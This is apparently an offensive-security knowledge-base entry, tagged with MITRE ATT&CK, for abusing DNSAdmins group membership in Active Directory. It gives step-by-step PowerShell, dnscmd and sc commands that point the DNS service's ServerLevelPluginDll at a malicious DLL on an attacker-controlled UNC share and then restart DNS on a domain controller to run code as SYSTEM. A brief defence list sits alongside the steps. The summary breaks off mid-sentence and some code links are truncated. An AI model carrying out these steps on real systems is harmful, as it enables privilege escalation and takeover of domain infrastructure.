---
id: 8a761063-8d65-4d76-89cd-e009cec4511e
name: Abusing DNSAdmins Group to Change DNS Service DLL
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.490396+00:00'
updated_at: '2023-04-10T20:26:10.299689+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Impact|TA0040 - Impact]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[DLL Search Order Hijacking|T1038 - DLL Search Order Hijacking]]'
- '[[Service Execution|T1035 - Service Execution]]'
- '[[Service Stop|T1489 - Service Stop]]'
tags:
- '[[Abusing DNS Admins Group]]'
- '[[Active Directory Attacks]]'
- '[[Active Directory Groups]]'
commands:
- '[[Configure DNS server with DNSServer module]]'
- '[[Configure DNS server with DNSServer module]]'
- '[[Configure DNS server with RSAT]]'
- '[[Configure DNS server with RSAT]]'
- '[[Get members of DNSAdmins group using Get-ADGroupMember]]'
- '[[Get members of DNSAdmins group using Get-NetGroupMember]]'
- '[[Start DNS service on DC01]]'
- '[[Stop DNS service on DC01]]'
---

# Abusing DNSAdmins Group to Change DNS Service DLL

## Summary

Abusing the DNSAdmins group is a common technique used by attackers to gain escalated privileges in Active Directory environments. By enumerating the members of the DNSAdmins group, an attacker can identify potential targets for privilege escalation. In this scenario, the attacker changes the DNS S

## Description

# Description

Abusing the DNSAdmins group is a common technique used by attackers to gain escalated privileges in Active Directory environments. By enumerating the members of the DNSAdmins group, an attacker can identify potential targets for privilege escalation. In this scenario, the attacker changes the DNS Service DLL by leveraging DLL Search Order Hijacking. This allows the attacker to execute arbitrary code with SYSTEM privileges. The business value of this attack is that it allows the attacker to gain full control over the DNS infrastructure, potentially leading to further compromise of the Active Directory environment.

 

## Requirements

1. Access to the Active Directory environment

1. Membership in the DNSAdmins group

1. Ability to execute commands on the target system

 

## Defense

1. Limit membership in the DNSAdmins group to only those who require it

1. Monitor for changes to the DNS Service DLL

1. Implement DLL search order hardening to prevent DLL hijacking

 

## Objectives

1. Gain escalated privileges in the Active Directory environment

1. Execute arbitrary code with SYSTEM privileges

1. Take control of the DNS infrastructure

 

# Instructions

1. To use this command, open PowerShell and run the following command:
Get-NetGroupMember -GroupName "DNSAdmins"
Get-ADGroupMember -Identity DNSAdmins

This command will return a list of all members of the DNSAdmins group.

 



**Code**: [[Get-NetGroupMember -GroupName "DNSAdmins"
Get-ADGr]]



> The Get-NetGroupMember command is used to retrieve the members of a specified group in the current domain. The -GroupName parameter specifies the name of the group to retrieve members for.

The Get-ADGroupMember command is used to retrieve the members of a specified group in Active Directory. The -Identity parameter specifies the name of the group to retrieve members for.



**Command** ([[Get members of DNSAdmins group using Get-NetGroupMember]]):

```bash
Get-NetGroupMember -GroupName "DNSAdmins"
```





**Command** ([[Get members of DNSAdmins group using Get-ADGroupMember]]):

```bash
Get-ADGroupMember -Identity DNSAdmins
```



2. This command is used to change the DLL file that is loaded by the DNS service. The command can be executed using either the RSAT or DNSServer module. The command allows you to load a malicious DLL file that can be used to perform privilege escalation.

 



**Code**: [[# with RSAT
dnscmd <servername> /config /serverlev]]



> The command has the following arguments:
- <servername>: The name or IP address of the server where the DNS service is running.
- \\attacker_IP\dll\mimilib.dll: The path to the malicious DLL file that will be loaded by the DNS service. Replace 'attacker_IP' with the IP address of the attacker's machine.
- \\10.10.10.10\exploit\privesc.dll: Another example path to a malicious DLL file that will be loaded by the DNS service.



**Command** ([[Configure DNS server with RSAT]]):

```bash
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
```





**Command** ([[Configure DNS server with RSAT]]):

```bash
dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll
```





**Command** ([[Configure DNS server with DNSServer module]]):

```bash
$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
```





**Command** ([[Configure DNS server with DNSServer module]]):

```bash
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```



3. This command retrieves the value of the 'ServerLevelPluginDll' property from the DNS service parameters in the Windows registry.

 



**Code**: [[Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Se]]



> The 'ServerLevelPluginDll' property specifies the path to a dynamic-link library (DLL) file that provides additional functionality to the DNS server service. This command can be used to verify that the property exists and to check its current value. If the command succeeds, it will return the value of the property. If the command fails, it may indicate that the property does not exist or that there was an issue accessing the registry. In such cases, further troubleshooting may be necessary.

4. To restart the DNS service on DC01, run the following commands:

 



**Code**: [[sc \\dc01 stop dns
sc \\dc01 start dns]]



> This command stops and starts the DNS service on the DC01 server. The 'sc' command is used to manage Windows services, and the '\\dc01' argument specifies the server on which to perform the action. The 'stop' and 'start' arguments are used to stop and start the DNS service, respectively.



**Command** ([[Stop DNS service on DC01]]):

```bash
sc \\dc01 stop dns
```





**Command** ([[Start DNS service on DC01]]):

```bash
sc \\dc01 start dns
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Impact|TA0040 - Impact]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[DLL Search Order Hijacking|T1038 - DLL Search Order Hijacking]]
- [[Service Execution|T1035 - Service Execution]]
- [[Service Stop|T1489 - Service Stop]]

## Commands Used

- [[Configure DNS server with DNSServer module]]
- [[Configure DNS server with DNSServer module]]
- [[Configure DNS server with RSAT]]
- [[Configure DNS server with RSAT]]
- [[Get members of DNSAdmins group using Get-ADGroupMember]]
- [[Get members of DNSAdmins group using Get-NetGroupMember]]
- [[Start DNS service on DC01]]
- [[Stop DNS service on DC01]]

## Tags

- [[Abusing DNS Admins Group]]
- [[Active Directory Attacks]]
- [[Active Directory Groups]]


